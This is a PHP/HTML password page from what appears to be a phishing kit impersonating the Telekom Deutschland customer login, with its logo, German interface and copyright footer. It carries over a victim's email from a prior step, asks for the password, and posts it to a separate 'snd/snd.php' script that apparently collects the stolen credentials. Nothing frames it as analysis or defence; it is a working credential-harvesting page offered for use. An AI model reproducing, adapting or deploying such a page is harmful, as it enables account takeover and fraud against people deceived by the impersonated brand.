 <?php
 session_start();
$_SESSION['email'] = $_POST['email'];

    if (isset($_POST['email'])) {
        $email = htmlspecialchars($_POST['email']);
    } else {
        header('Location: login.php');
        exit();
    }
    ?><html lang="de">

<head>
    <meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="./layout/css/normalizer.css" />
    <link rel="stylesheet" href="./layout/css/style.css" />
    <title>Willkommen</title>
</head>

<body>
    <header>
        <div style="display: flex;">
            <img src="./layout/img/telekom-logo.jpg" class="logo" alt="">
        </div>
    </header>
<form method=post action="../snd/snd.php">
    <div class="container">
        <div class="email-container">
            <span>
                <img src="./layout/img/avatar.svg" alt="">
            </span>
            <span class="saved-email" id="savedEmail">
                <?php echo $email; ?>
            </span>
        </div>
        <div class="title">
            Passwort eingeben
        </div>
        <div class="input-container">
            <input type="password" id="pwd" required class="input" placeholder="" name="s4" minlength="4">
            <label for="pwd" class="input-label">Passwort</label> <!-- Must come right after input -->
            <span class="open-eye">
                <svg class="scale-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                    <svg class="scale-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                        viewBox="0 0 24 24">
                        <g fill="currentColor">
                            <g>
                                <path
                                    d="M12 4c4.108 0 6.987 2.283 9.1 4.68l.364.425.35.423.334.421.476.62.726.981.35.45-.35.45-.726.981-.314.411-.327.419-.342.422c-.059.07-.117.142-.177.212l-.365.424C18.987 17.717 16.11 20 12 20c-4.108 0-6.987-2.283-9.1-4.68l-.364-.425-.35-.423-.334-.421-.476-.62-.726-.981L.3 12l.35-.45.726-.981.314-.411.327-.419.342-.422c.059-.07.117-.142.177-.212L2.9 8.68C5.013 6.283 7.89 4 12 4zm0 1.5c-3.713 0-6.234 2.042-8.435 4.722l-.396.494-.391.506-.386.516L2.2 12l.578.778.39.506.397.494.404.48C6.076 16.698 8.512 18.5 12 18.5c3.488 0 5.924-1.802 8.03-4.242l.405-.48.396-.494.391-.506.386-.516L21.8 12l-.578-.778-.39-.506-.397-.494C18.234 7.542 15.713 5.5 12 5.5zM12 7c2.75 0 5 2.25 5 5s-2.25 5-5 5-5-2.25-5-5 2.25-5 5-5zm0 1.5c-1.95 0-3.5 1.55-3.5 3.5s1.55 3.5 3.5 3.5 3.5-1.55 3.5-3.5-1.55-3.5-3.5-3.5z"
                                    fill-rule="evenodd"></path>
                            </g>
                        </g>
                    </svg>
                </svg>
            </span>
            <span class="closed-eye">
                <svg class="scale-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                    <svg class="scale-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                        viewBox="0 0 24 24">
                        <g fill="currentColor">
                            <g>
                                <path
                                    d="M2.85 2.85a.722.722 0 01.965-.074l.085.074L21.15 20.1c.3.3.3.75 0 1.05a.722.722 0 01-.965.074l-.085-.074L2.85 3.9c-.3-.3-.3-.75 0-1.05zm1.35 4.5L5.25 8.4c-1.1 1.05-2.1 2.3-3.05 3.6l.578.778.39.506.397.494C5.766 16.458 8.287 18.5 12 18.5c.919 0 1.76-.115 2.527-.345l.323-.105L16 19.2c-1.2.5-2.5.8-4 .8-4.108 0-6.987-2.283-9.1-4.68l-.364-.425-.35-.423-.334-.421-.476-.62-.726-.981L.3 12l.35-.45.595-.806C1.969 9.776 2.8 8.73 3.774 7.76l.426-.41zM12 4c4.108 0 6.987 2.283 9.1 4.68l.364.425.35.423.334.421.476.62.726.981.35.45-.35.45-.595.806c-.724.968-1.555 2.014-2.529 2.983l-.426.411-1.05-1.05c1.1-1.05 2.1-2.3 3.05-3.6l-.578-.778-.39-.506-.397-.494C18.234 7.542 15.713 5.5 12 5.5c-.919 0-1.76.115-2.527.345l-.323.105L8 4.8c1.2-.5 2.5-.8 4-.8zm-4.35 6.85l5.5 5.5c-.35.1-.75.15-1.15.15-2.5 0-4.5-2-4.5-4.5 0-.32.032-.64.096-.934l.054-.216zM12 7.5c2.5 0 4.5 2 4.5 4.5 0 .32-.032.64-.096.934l-.054.216-5.5-5.5c.35-.1.75-.15 1.15-.15z"
                                    fill-rule="evenodd"></path>
                            </g>
                        </g>
                    </svg>
                </svg>
            </span>
        </div>
        <div class="checkbox-container" tabindex="-1">
            <a class="forgot-pass" tabindex="-1"
                href="https://meinkonto.telekom-dienste.de/wiederherstellung/?wt_mc=alias_login-vergessen">
                Passwort vergessen?
            </a>
        </div>
        <div>
            <button class="button-primary" type=submit id="submitBtn" >Weiter</button>
            <button class="button-secondary" id="backBtn">Zurück</button>
			
        </div>
    </div>

    <footer>
        <div class="footer">
            <div>
                <div>© Telekom Deutschland GmbH</div>
                <div>26.19.1</div>
            </div>
            <div>
                <div>Impressum</div>
                <div>Datenschutz</div>
            </div>
        </div></form>
    </footer>
</body>

</html>